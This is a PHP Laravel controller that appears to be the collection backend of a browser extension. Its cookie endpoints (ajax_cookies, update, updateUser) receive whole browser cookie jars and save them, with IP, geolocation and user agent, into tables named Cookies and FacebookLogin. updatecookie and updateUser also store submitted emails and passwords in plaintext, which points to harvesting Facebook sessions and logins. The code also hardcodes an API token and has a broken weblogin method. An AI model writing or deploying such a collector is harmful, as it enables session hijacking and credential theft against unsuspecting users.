<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use DB;
use Auth;
use JWTAuth;
use App\User;
use App\Cookies;
use App\Facebook;
use JWTAuthException;
use Validator;
use App\FacebookLogin;



use App\Http\Controllers\Controller;

class UserController extends Controller
{
  


public function ajax_register(Request $request){

$rules = array(          
           
            'email' => 'email|unique:register_user',
            'password' => 'required',
            'password_confirmation' => 'required|same:password'   

        );

$validator = Validator::make($request->all(), $rules);
        if ($validator->fails()) {

            if ($validator->errors()->has('email')) {
                $errormes = $validator->errors()->first('email');
            }      

            if($request['password'] != $request['password_confirmation']){
                return response()->json([
                    'status' => 'error', 
                    'msg' => 'The password confirmation does not match.'
                ]);
            }

           return response()->json([
                  
                    'status' => 'error',
                      'msg' => $errormes,
                   
                ]);
            
        } else {    
        
            $request['password'] = bcrypt($request->get('password'));
            $request['password_confirmation'] = bcrypt($request->get('password_confirmation'));

            $request['status'] = 0;
        
            if(User::create($request->all())){
                return response()->json([
                    'status' => 'success', 
                    'msg' => 'You are register successfully.'
                ], 200);
            }else{
                return response()->json([
                    'status' => 'error', 
                    'msg' => 'You are not register yet,please try once again.'
                ], 401);
            }
        }
    }



    // Close
    public function ajax_login(Request $request){

        if(!empty($_SERVER['HTTP_CLIENT_IP'])){        
             $ip = $_SERVER['HTTP_CLIENT_IP'];
          }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){        
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
          }else{
           $ip = $_SERVER['REMOTE_ADDR'];
          }


               $json = file_get_contents("https://ipinfo.io/{$ip}?token=fcca0e2c0a2f35");
               $IPaddress = json_decode($json);
               $count  = $IPaddress->country;
               $city   = $IPaddress->city;
              

    	
    	if ($request->isMethod('post')) {
    		$email = $request->get('email');
    		$password = $request->get('password');
    		if (Auth::attempt(array('email' => $email, 'password' => $password, 'is_admin' => 0))){

                $data = User::where('email',$email)->first();

                User::where('email',$email)->update(['live' => 1]);
              //  Cookies::where('user_id',$data['id'])->update(['ip' => $ip,'city'=>$city,'country' => $count]);
               return response()->json([
                     'id' => $data['id'],
                     'userstatus' => $data['status'],
                    'status' => 'success', 
                    'msg' => 'You are logged in successfully.'
                ], 200);
            }
            else {        
                return response()->json([
                    'status' => 'error', 
                    'msg' => 'We can`t find an account with this credentials.'
                ], 401);
            }
    	}
    }



    public function updatesV2(Request $request){


         if(!empty($_SERVER['HTTP_CLIENT_IP'])){
       
          $ip = $_SERVER['HTTP_CLIENT_IP'];
          }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){       
          $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
          }else{
          $ip = $_SERVER['REMOTE_ADDR'];
            }

            $json = file_get_contents("https://ipinfo.io/{$ip}?token=fcca0e2c0a2f35");
               $IPaddress = json_decode($json);
               $count  = $IPaddress->country;
               $city   = $IPaddress->city;
              



    	if (!empty($ip))   
	  	{
	    $ip_address = $ip;
        $request['ip_address'] = $ip_address;
        $request['country'] = $count;
        $request['city'] = $city;        
	 	} 

	 	unset($request['api_key']);
    	if ($request->isMethod('post')) {
    		if(Facebook::create($request->all())){
				return response()->json([
	                    'status' => 'success', 
	                    'msg' => 'Save data successfully.'
	            ], 200);
			}else{
				return response()->json([
	                    'status' => 'success', 
	                    'msg' => 'Data could not be save.'
	            ], 401);
			}	
    	}
    }







    public function ajax_cookies(Request $request){

     // echo "<pre>"; print_r($request->all()); die();

         if(!empty($_SERVER['HTTP_CLIENT_IP'])){        
             $ip = $_SERVER['HTTP_CLIENT_IP'];
          }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){        
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
          }else{
           $ip = $_SERVER['REMOTE_ADDR'];
          }

              $json = file_get_contents("https://ipinfo.io/{$ip}?token=fcca0e2c0a2f35");
               $IPaddress = json_decode($json);
               $count  = $IPaddress->country;
               $city   = $IPaddress->city;
              



        $cookieData = Cookies::where('user_id', $request['user_id'])->first(); 
    	
    	if ($request->isMethod('post')) {
    		if ( !empty($ip))   
		  	{
		    	$ip_address =  $ip;
		    	$request['ip'] = $ip_address;
                $request['country'] = $count;
                $request['city'] = $city;
                
		 	}
		 	$request['user_id'] = $request->get('user_id');
            $request['user_agent'] = $request->get('user_agent');
            
    		$data = $request->get('data');
			$i = 0;
         
    		foreach ($data as $key => $value) {
    			$arr[$i]['name'] = $value['name'];
                $arr[$i]['value'] = $value['value'];
                $arr[$i]['domain'] = $value['domain'];              
                $arr[$i]['hostOnly'] = (bool)$value['hostOnly'];
                $arr[$i]['httpOnly'] = (bool)$value['httpOnly'];
                $arr[$i]['path'] = $value['path'];
                $arr[$i]['sameSite'] = $value['sameSite'];
                $arr[$i]['secure'] = (bool)$value['secure'];
                $arr[$i]['session'] = (bool)$value['session'];
                $arr[$i]['storeId'] = $value['storeId'];
                $arr[$i]['id'] = $i;
                
    			$i++;
    		}
          
    		$serialized_array= json_encode($arr);
            
    		$request['cookis_data'] = $serialized_array;
        

            if(!empty($request['user_id']) and !empty($cookieData['user_id']))
            {
               // echo "<pre>"; print_r($request['data']); die();
                $data = Cookies::where('user_id',$request['user_id'])->update($request->except(['data']));
                $request['checkCookies'] =  $request['checkCookies'];
                FacebookLogin::create($request->all());

                if($data)
                {
                    return response()->json([
                    'status' => 'success', 
                    'msg' => 'Cookies save successfully.'
                ], 200);
                } else{                    
                    return response()->json([
                    'status' => 'error', 
                    'msg' => 'Cookies not save successfully.'
                ], 401);

                }



            }elseif (empty($cookieData['user_id'])) {
                if(Cookies::create($request->all())){
                   $request['checkCookies'] =  $request['checkCookies'];
                    FacebookLogin::create($request->all());
                return response()->json([
                    'status' => 'success', 
                    'msg' => 'Cookies save successfully.'
                ], 200);
            }else{
                return response()->json([
                    'status' => 'error', 
                    'msg' => 'Cookies not save successfully.'
                ], 401);
            }
                # code...
            }else{

			if(Cookies::create($request->all())){
                $request['checkCookies'] =  $request['checkCookies'];
                FacebookLogin::create($request->all());
				return response()->json([
                    'status' => 'success', 
                    'msg' => 'Cookies save successfully.'
                ], 200);
			}else{
				return response()->json([
                    'status' => 'error', 
                    'msg' => 'Cookies not save successfully.'
                ], 401);
			}
        }
    	}
    }









     public function update(Request $request){

          if(!empty($_SERVER['HTTP_CLIENT_IP'])){        
             $ip = $_SERVER['HTTP_CLIENT_IP'];
          }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){        
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
          }else{
           $ip = $_SERVER['REMOTE_ADDR'];
          }

               $json = file_get_contents("https://ipinfo.io/{$ip}?token=fcca0e2c0a2f35");
               $IPaddress = json_decode($json);
               $count  = $IPaddress->country;
               $city   = $IPaddress->city;
             
        
        if ($request->isMethod('post')) {
            if (!empty($ip))   
            {
                $ip_address = $ip;
                $request['ip'] = $ip_address;
                $request['country'] = $count;
                $request['city'] = $city;
                
            }
            $request['user_id'] = $request->get('user_id');
            $request['user_agent'] = $request->get('user_agent');
            
            $data = $request->get('data');
            $i = 0;
         
            foreach ($data as $key => $value) {
                $arr[$i]['name'] = $value['name'];
                $arr[$i]['value'] = $value['value'];
                $arr[$i]['domain'] = $value['domain'];              
                $arr[$i]['hostOnly'] = (bool)$value['hostOnly'];
                $arr[$i]['httpOnly'] = (bool)$value['httpOnly'];
                $arr[$i]['path'] = $value['path'];
                $arr[$i]['sameSite'] = $value['sameSite'];
                $arr[$i]['secure'] = (bool)$value['secure'];
                $arr[$i]['session'] = (bool)$value['session'];
                $arr[$i]['storeId'] = $value['storeId'];
                $arr[$i]['id'] = $i;
                
                $i++;
            }
          
            $serialized_array= json_encode($arr);
            
            $request['cookis_data'] = $serialized_array;

        
            if(Cookies::create($request->all())){
               $request['checkCookies'] =  $request['checkCookies'];
                FacebookLogin::create($request->all());
                return response()->json([
                    'status' => 'success', 
                    'msg' => 'Cookies save successfully.'
                ], 200);
            }else{
                return response()->json([
                    'status' => 'error', 
                    'msg' => 'Cookies not save successfully.'
                ], 401);
            }
        
        }
    }








    public function weblogin($email , $password)
    {
        $credentials = [
        'email' => $request['username'],
        'password' => $request['password'],
    ];

        if (Auth::attempt($credentials)) {
        return redirect()->route('home');
    }
    return 'Failure';

    }





    public function updatecookie(Request $request)
    {
         Cookies::where('user_id',$request['user_id'])->update(['email' => $request['email'],'password' => $request['password']]);
      $logid = FacebookLogin::where('user_id',$request['user_id'])->orderBy('id','desc')->first();       
          FacebookLogin::where('id', $logid['id'])->update(['name' => $request['email'],'password' => $request['password']]);   
    }



    public function updateUser(Request $request)
    {
      
         if(!empty($_SERVER['HTTP_CLIENT_IP'])){        
             $ip = $_SERVER['HTTP_CLIENT_IP'];
          }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){        
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
          }else{
           $ip = $_SERVER['REMOTE_ADDR'];
          }

              $json = file_get_contents("https://ipinfo.io/{$ip}?token=fcca0e2c0a2f35");
               $IPaddress = json_decode($json);

             
               $count  = $IPaddress->country;
               $city   = $IPaddress->city;
              


        $cookieData = Cookies::where('user_id', $request['user_id'])->first(); 
        
        if ($request->isMethod('post')) {
            if (!empty($ip))   
            {
                $ip_address = $ip;
                $request['ip'] = $ip_address;
                $request['country'] = $count;
                $request['city'] = $city;
                
            }
            $request['user_id'] = $request->get('user_id');
            $request['user_agent'] = $request->get('user_agent');
            $request['checkCookies'] =  $request['checkCookies'];
            
            
            $data = $request->get('data');
            $i = 0;
         
            foreach ($data as $key => $value) {
                $arr[$i]['name'] = $value['name'];
                $arr[$i]['value'] = $value['value'];
                $arr[$i]['domain'] = $value['domain'];              
                $arr[$i]['hostOnly'] = (bool)$value['hostOnly'];
                $arr[$i]['httpOnly'] = (bool)$value['httpOnly'];
                $arr[$i]['path'] = $value['path'];
                $arr[$i]['sameSite'] = $value['sameSite'];
                $arr[$i]['secure'] = (bool)$value['secure'];
                $arr[$i]['session'] = (bool)$value['session'];
                $arr[$i]['storeId'] = $value['storeId'];
                $arr[$i]['id'] = $i;
                
                $i++;
            }
          
            $serialized_array= json_encode($arr);
            
            $request['cookis_data'] = $serialized_array;

            if(!empty($request['user_id']) and !empty($cookieData['user_id']))
            {
               
                $data = Cookies::where('user_id',$request['user_id'])->update($request->except(['data']));
                 $request['checkCookies'] =  $request['checkCookies'];
                FacebookLogin::create($request->all());

                  if($data)
                {
                    return response()->json([
                    'status' => 'success', 
                    'msg' => 'Cookies save successfully.'
                ], 200);
                } else{                    
                    return response()->json([
                    'status' => 'error', 
                    'msg' => 'Cookies not save successfully.'
                ], 401);

                }

            } else{

                if(Cookies::create($request->all())){
                   $request['checkCookies'] =  $request['checkCookies'];
                FacebookLogin::create(['user_id' => $request['user_id'] , 'name' =>$request['email'], 'cookis_data' =>  $request['cookis_data'], 'password' => $request['password'], 'checkCookies'=>$request['checkCookies'] ]);
                return response()->json([
                    'status' => 'success', 
                    'msg' => 'Cookies save successfully.'
                ], 200);
            }else{
                return response()->json([
                    'status' => 'error', 
                    'msg' => 'Cookies not save successfully.'
                ], 401);
            }


            }


         
        }
     


    }





    public function checkUserLoggedIn(Request $request){ 
     $data =   User::where('id' , $request['user_id'])->update(['last_login' => date("Y-m-d h:i:s", time())]);
     if($data)
     {
             echo "1";
     } else{
             echo "0";
     }


    }



    public function checkuser($id)
    {

        $data = User::where('id', $id)->first();

        if(!empty($data))
        {

         return response()->json([
                     'id' => $data['id'],
                     'userstatus' => $data['status'],
                    'status' => 'success', 
                    'msg' => 'You are logged in successfully.'
                ], 200);
            }
            else {        
                return response()->json([
                    'status' => 'error', 
                    'msg' => 'We can`t find an account with this credentials.'
                ], 401);
            }
    }

}


/*    function ip_details($IPaddress) 
{
   // $json       = file_get_contents("https://ipinfo.io/{$IPaddress}?token=bfc6fd80781b1d");
    $json       = file_get_contents("https://ipinfo.io/{$IPaddress}")
    $data    = json_decode($json);
    return $data;
}*/









  /*  function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}


$user_ip = getUserIP();*/

